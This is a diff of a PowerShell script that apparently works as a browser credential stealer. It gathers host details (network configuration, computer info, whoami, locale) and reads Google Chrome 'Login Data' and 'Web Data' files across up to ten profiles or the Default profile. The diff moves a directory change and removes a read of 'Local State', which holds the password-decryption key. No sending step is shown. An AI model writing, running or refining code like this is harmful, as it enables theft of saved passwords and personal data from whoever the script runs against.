@@ -5,15 +5,12 @@
 
 $var += Get-NetIPConfiguration;Get-ComputerInfo;whoami;Get-Date
 
-$var += Get-Content "Local State"
-
-cd Default 
-
 $var += Get-WinSystemLocale
 
 # if profiles exist try 1 - 10 if not pull data normally... (GOOGLE CHROME)
 
-if (Test-Path -Path "Profile 1") { 
+if (Test-Path -Path "Profile 1") {
+
     $var += cat -Path "Profile 1\Web Data"
 
     $var += cat -Path "Profile 2\Login Data"
@@ -52,6 +49,8 @@ if (Test-Path -Path "Profile 1") {
 
     $var += cat -Path "Profile 10\Web Data"
 } else {
+    cd Default
+    
     $var += Get-Content "Login Data"
 
     $var += Get-Content "Web Data"
